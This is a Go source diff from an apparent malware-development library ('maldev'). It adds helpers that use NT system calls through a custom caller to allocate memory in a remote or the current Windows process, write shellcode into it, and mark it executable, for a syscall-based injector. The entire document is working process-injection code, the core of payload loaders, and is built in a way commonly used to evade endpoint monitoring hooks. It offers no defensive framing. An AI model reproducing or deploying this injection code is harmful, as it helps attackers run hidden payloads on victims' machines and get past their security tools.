@@ -10,6 +10,7 @@ import (
 	"unsafe"
 
 	"github.com/oioio-space/maldev/win/api"
+	wsyscall "github.com/oioio-space/maldev/win/syscall"
 	"golang.org/x/sys/windows"
 )
 
@@ -840,4 +841,112 @@ func allocateAndWriteMemoryRemote(hProcess windows.Handle, shellcode []byte) (ui
 	}
 
 	return addr, nil
+}
+
+// --- Caller-aware helpers (used by windowsSyscallInjector) ---
+
+// allocateAndWriteMemoryRemoteWithCaller uses NT syscalls via the Caller to
+// allocate, write, and protect remote process memory. If caller is nil it
+// falls back to allocateAndWriteMemoryRemote.
+func allocateAndWriteMemoryRemoteWithCaller(hProcess windows.Handle, shellcode []byte, caller *wsyscall.Caller) (uintptr, error) {
+	if caller == nil {
+		return allocateAndWriteMemoryRemote(hProcess, shellcode)
+	}
+
+	// 1. NtAllocateVirtualMemory (remote)
+	var baseAddr uintptr
+	regionSize := uintptr(len(shellcode))
+
+	r, err := caller.Call("NtAllocateVirtualMemory",
+		uintptr(hProcess),
+		uintptr(unsafe.Pointer(&baseAddr)),
+		0,
+		uintptr(unsafe.Pointer(&regionSize)),
+		windows.MEM_COMMIT|windows.MEM_RESERVE,
+		windows.PAGE_READWRITE,
+	)
+	if r != 0 {
+		return 0, fmt.Errorf("NtAllocateVirtualMemory: NTSTATUS 0x%X: %w", uint32(r), err)
+	}
+
+	// 2. NtWriteVirtualMemory
+	var bytesWritten uintptr
+	r, err = caller.Call("NtWriteVirtualMemory",
+		uintptr(hProcess),
+		baseAddr,
+		uintptr(unsafe.Pointer(&shellcode[0])),
+		uintptr(len(shellcode)),
+		uintptr(unsafe.Pointer(&bytesWritten)),
+	)
+	if r != 0 {
+		return 0, fmt.Errorf("NtWriteVirtualMemory: NTSTATUS 0x%X: %w", uint32(r), err)
+	}
+
+	// 3. NtProtectVirtualMemory -> PAGE_EXECUTE_READ
+	var oldProtect uint32
+	protectAddr := baseAddr
+	protectSize := uintptr(len(shellcode))
+
+	r, err = caller.Call("NtProtectVirtualMemory",
+		uintptr(hProcess),
+		uintptr(unsafe.Pointer(&protectAddr)),
+		uintptr(unsafe.Pointer(&protectSize)),
+		uintptr(windows.PAGE_EXECUTE_READ),
+		uintptr(unsafe.Pointer(&oldProtect)),
+	)
+	if r != 0 {
+		return 0, fmt.Errorf("NtProtectVirtualMemory: NTSTATUS 0x%X: %w", uint32(r), err)
+	}
+
+	return baseAddr, nil
+}
+
+// allocateAndWriteMemoryLocalWithCaller uses NT syscalls via the Caller to
+// allocate, write, and protect local (current process) memory.
+// If caller is nil it falls back to allocateAndWriteMemoryLocal.
+func allocateAndWriteMemoryLocalWithCaller(shellcode []byte, caller *wsyscall.Caller) (uintptr, error) {
+	if caller == nil {
+		return allocateAndWriteMemoryLocal(shellcode)
+	}
+
+	currentProcess := uintptr(0xFFFFFFFFFFFFFFFF) // pseudo-handle
+
+	// 1. NtAllocateVirtualMemory (PAGE_READWRITE)
+	var baseAddr uintptr
+	regionSize := uintptr(len(shellcode))
+
+	r, err := caller.Call("NtAllocateVirtualMemory",
+		currentProcess,
+		uintptr(unsafe.Pointer(&baseAddr)),
+		0,
+		uintptr(unsafe.Pointer(&regionSize)),
+		windows.MEM_COMMIT|windows.MEM_RESERVE,
+		windows.PAGE_READWRITE,
+	)
+	if r != 0 {
+		return 0, fmt.Errorf("NtAllocateVirtualMemory: NTSTATUS 0x%X: %w", uint32(r), err)
+	}
+
+	// 2. Copy shellcode (direct memory write - we own the process)
+	for i, b := range shellcode {
+		*(*byte)(unsafe.Pointer(baseAddr + uintptr(i))) = b
+	}
+
+	// 3. NtProtectVirtualMemory -> PAGE_EXECUTE_READ
+	var oldProtect uint32
+	protectAddr := baseAddr
+	protectSize := uintptr(len(shellcode))
+
+	r, err = caller.Call("NtProtectVirtualMemory",
+		currentProcess,
+		uintptr(unsafe.Pointer(&protectAddr)),
+		uintptr(unsafe.Pointer(&protectSize)),
+		uintptr(windows.PAGE_EXECUTE_READ),
+		uintptr(unsafe.Pointer(&oldProtect)),
+	)
+	if r != 0 {
+		return 0, fmt.Errorf("NtProtectVirtualMemory: NTSTATUS 0x%X: %w", uint32(r), err)
+	}
+
+	return baseAddr, nil
 }
